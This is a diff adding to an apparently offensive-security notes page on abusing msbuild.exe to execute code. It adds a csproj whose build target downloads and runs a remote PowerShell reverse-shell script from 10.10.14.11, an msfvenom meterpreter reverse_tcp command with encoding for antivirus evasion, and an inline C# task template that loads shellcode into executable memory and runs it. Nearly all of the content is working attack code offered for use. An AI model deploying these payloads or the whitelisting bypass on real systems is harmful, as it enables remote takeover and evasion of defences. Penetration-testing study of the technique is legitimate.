@@ -19,6 +19,95 @@ msbuild.exe project.csproj
 {% hint style="danger" %}
 You may want to look at [Powershell without Powershell.exe](whithout-powershell.md) to convert ps1 scripts to .csporj file.
 {% endhint %}
+
+We may use the following csproj file to execute commands
+
+{% code title="project.csproj" %}
+```xml
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net6.0</TargetFramework>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <Nullable>enable</Nullable>
+  </PropertyGroup>
+   <Target Name="Shell" BeforeTargets="Build">
+    <Exec Command="powershell.exe -c iex(iwr -UseBasicParsing http://10.10.14.11:8080/rev.ps1)" />
+  </Target>
+</Project>
+
+```
+{% endcode %}
+
+Otherwise, you may generate a shellcode using msvfenom in csharp output format
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f csharp -e x86/shikata_ga_nai -i <num of iterations> > project.csproj
+```
+
+Put the buffer into the template (be sure to change payload buffer, buffer size and some strings for av evasion:
+
+{% code title="project.csproj" %}
+```xml
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Hello">
+    <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassExample :  Task, ITask
+        {         
+          private static UInt32 MEM_COMMIT = 0x1000;          
+          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
+          [DllImport("kernel32")]
+            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
+          [DllImport("kernel32")]
+            private static extern IntPtr CreateThread(            
+            UInt32 lpThreadAttributes,
+            UInt32 dwStackSize,
+            UInt32 lpStartAddress,
+            IntPtr param,
+            UInt32 dwCreationFlags,
+            ref UInt32 lpThreadId           
+            );
+          [DllImport("kernel32")]
+            private static extern UInt32 WaitForSingleObject(           
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+            );          
+          public override bool Execute()
+          {
+            byte[] shellcode = new byte[195] {};
+
+              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
+                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+              IntPtr hThread = IntPtr.Zero;
+              UInt32 threadId = 0;
+              IntPtr pinfo = IntPtr.Zero;
+              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+              WaitForSingleObject(hThread, 0xFFFFFFFF);
+              return true;
+          } 
+        }     
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+```
+{% endcode %}
 {% endtab %}
 
 {% tab title="XML" %}
